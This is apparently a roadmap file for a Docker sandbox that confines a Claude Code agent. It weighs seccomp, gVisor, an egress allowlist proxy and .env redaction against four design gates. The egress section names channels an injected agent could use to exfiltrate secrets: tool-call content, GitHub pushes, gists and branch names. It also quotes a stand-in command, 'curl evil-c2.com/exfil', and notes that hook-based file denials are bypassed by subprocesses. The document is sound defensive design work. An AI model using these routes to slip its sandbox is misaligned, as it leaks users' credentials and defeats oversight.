# Future tasks

What is **not** built, and the constraints anything proposed here must satisfy. Shipped work and
its rationale live in `docs/design-notes/`; this file carries only the open edges.

IDs here (`K`ernel/container · `E`gress · `R`edaction) are local to this file. `docs/SECURITY_AUDIT.md`
numbers its own findings and residual risks independently — its `R1` is not this file's `R1`.

---

## The gates

Every mechanism is measured against these four first. A proposal that violates one is
**DISQUALIFIED**, not low-rated.

| Gate | Requirement |
|---|---|
| **CAP** | The agent container runs `cap-drop=ALL`. A quarantined sidecar the agent cannot reach *may* hold `CAP_SYS_ADMIN`. |
| **OS** | One design covers Ubuntu and macOS. |
| **POST** | Redaction covers files created **after** launch, not only those present at start. |
| **LIVE** | The project stays a live mount at the same absolute path — Claude's configs are path-keyed. |

`CAP` is why the FUSE sidecar exists. The `:rslave` propagation, `fuse_mounted()`, the
unmount-ordering rule and the refuse-to-delete-a-live-mountpoint guard are the price of keeping
the cap somewhere the agent has no handle to. **You cannot have both `cap-drop=ALL` and a
single-container topology** — macOS buys the simpler topology by accepting capless-at-*runtime*
instead (`docs/design-notes/macos.md`).

---

## Open work

### K1 · Tighter custom seccomp profile ★★★☆☆

Docker's default blocks ~44 syscalls; a custom profile blocks more. Capless, portable, no new
dependency, no macOS complication, no interaction with the broker or either FUSE mode. It hardens
the existing boundary rather than moving it — modest ceiling, near-zero risk, passes every gate.

### K2 · gVisor (`runsc`) — Linux-only opt-in ★★☆☆☆, sequenced after K1

One flag on `docker run`; collapses the host syscall surface with no KVM and no guest kernel.
Three load-bearing caveats:

- **VERIFY first:** `runsc`'s FUSE support is incomplete and gated. If it cannot service
  `/dev/fuse` the way the sidecar needs, gVisor is dead here.
- yoloAI documents Claude Code hanging in `epoll_pwait` under gVisor on macOS.
- runsc ignores iptables — one more reason any egress work must be a proxy, not packet filtering.

Linux-only, so it fails **OS** as a unified answer: opt-in, never default.

```bash
# Can gVisor service /dev/fuse? Run only if pursuing K2.
docker run --rm --runtime=runsc --cap-add=SYS_ADMIN --device /dev/fuse \
  keep-it-in-your-box sh -c 'ls -l /dev/fuse && python3 -c "import fuse; print(\"ok\")"'
```

### E1 · Filtering egress proxy — design record, **not scheduled**

The agent container loses its default route; all egress goes through a sidecar proxy with a
domain allowlist (the fence / sandbox-runtime model). It passes every gate — the proxy is a
sidecar, the agent just loses its route — and it would share the broker's sidecar rather than
adding one. `~/.keep-it-in-your-box/config` already reserves the keys (`egress`,
`allow_host_services`, `allow_lan`, `lan_cidrs`; `KIB_CFG_EGRESS` defaults to `open`).

**It is not scheduled, because it is not an exfiltration boundary:**

- `api.anthropic.com` must stay open and is itself bidirectional — an injected agent encodes
  secrets into its own tool-call content. No allowlist can touch that channel.
- GitHub and the package registries must be allowed for the agent to work, and the moment they
  are, exfil is trivial (push to your own repo, a gist, a branch name).
- The field says so unprompted (fence: *"if you allow a domain, code can exfiltrate via that
  domain"*).

So an allowlist is a speed-bump against the **accidental** case (`curl evil-c2.com/exfil` where
the C2 domain isn't listed) and a blast-radius reducer for unattended runs. The real fix was
removing the thing worth stealing — the credential broker, shipped and on by default. Revisit E1
only if a concrete unattended-run scenario makes the accident-class reduction worth the sidecar.

What survives an allowlist: `WebSearch` is server-side, so it works behind an
`api.anthropic.com`-only list. What breaks: `npm`/`pip`/`cargo`/`apt`, `git clone` from arbitrary
forges, binary downloads. That is why it would ship **opt-in, off by default**.

### R5 · Tool-layer `PreToolUse` denial ★★☆☆☆ — a layer, never the mechanism

aicontainer's approach: a hook refusing `Read`/`Edit`/`Write`/`Grep`/`Glob` on `.env*`. Capless,
portable, covers after-launch files by checking the path at call time, so it passes all four
gates. But **it is not a boundary** — any subprocess bypasses it, and aicontainer's own changelog
documents three patched bypasses. Worth adding on top of FUSE as cheap defence-in-depth; worthless
as the enforcement point.

---

## Settled dead ends — do not re-propose

| Option | Killed by |
|---|---|
| **E2** iptables / ipset inside the agent container | **CAP** — needs `CAP_NET_ADMIN`. Independently a silent no-op under gVisor (runsc's userspace netstack ignores iptables). |
| **R1** Landlock | **OS** (Linux-only) *and* it cannot deny a subpath inside an allowed directory — which is the entire requirement (`.env` inside a writable project). This is why cplt's `.env` protection is not kernel-enforced on Linux. |
| **R2** overlayfs with masked upper layer | **CAP** (mount needs `CAP_SYS_ADMIN`) and **POST** (composed at mount time, so `.env.production` created later lands unmasked). |
| **R3** `/dev/null` bind masks (fence's mechanism) | **POST** — a bind mount cannot cover a file that does not exist yet. sandbox-runtime documents this against itself. |
| **R4** copy-in / copy-out (yoloAI `:copy`) | **LIVE** — discards the same-absolute-path live mount and adds an apply step. A different product. |
| **K3** Kata / Firecracker microVM | **OS** (needs KVM; unavailable under Docker Desktop without nested virt) and it closes none of the documented risks, which cross through files the *host* executes later. |
| **C1** sentinel + TLS-terminating proxy | Shelved, not disqualified: the base-URL broker already works with no CA in the container trust store, so the sentinel buys nothing today. Keep as the fallback if Claude ever stops honouring `ANTHROPIC_BASE_URL`. |

---

## Open questions

- [ ] **Broker env precedence** — does a container `-e ANTHROPIC_BASE_URL` win over a per-project
      (agent-writable) `settings.json` `env` entry? If the file wins, re-pin in
      `guest/entrypoint/docker-entrypoint.sh`.
- [ ] **`WebFetch`** — server-side (survives an allowlist, like `WebSearch`) or a client-side
      fetch (breaks under E1)?
- [ ] **On-hardware VERIFY, needs a Mac** — the two items listed in
      `docs/design-notes/macos.md` § "Still open".
- [ ] **On-hardware VERIFY, needs Docker** — the `hosted_mcp` sidecar end-to-end; see
      `docs/design-notes/credential-broker.md` § "Delivery modes".
